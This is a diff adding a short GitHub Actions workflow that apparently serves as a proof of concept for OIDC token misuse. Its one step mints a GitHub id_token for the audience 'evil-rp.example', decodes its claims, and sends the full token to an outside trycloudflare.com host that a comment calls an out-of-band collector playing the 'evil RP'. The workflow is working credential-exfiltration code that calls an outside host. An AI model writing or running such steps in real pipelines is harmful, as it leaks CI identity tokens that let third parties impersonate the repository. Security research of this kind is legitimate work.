@@ -1,0 +1,15 @@
+name: r31rp
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  t:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          # mint an id_token for a DIFFERENT relying party and hand it to that RP (our OOB collector plays the evil RP).
+          T=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=evil-rp.example" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
+          echo "$T" | python3 -c 'import sys,json,base64;p=sys.stdin.read().split(".")[1];p+="="*(-len(p)%4);d=json.loads(base64.urlsafe_b64decode(p));print({k:d.get(k) for k in ("aud","repository","repository_id","iat","exp")})'
+          curl -s -o /dev/null -w 'sent to RP: HTTP %{http_code}\n' "https://jean-combined-lab-forwarding.trycloudflare.com/F68rp-${GITHUB_RUN_ID}?id_token=$T"
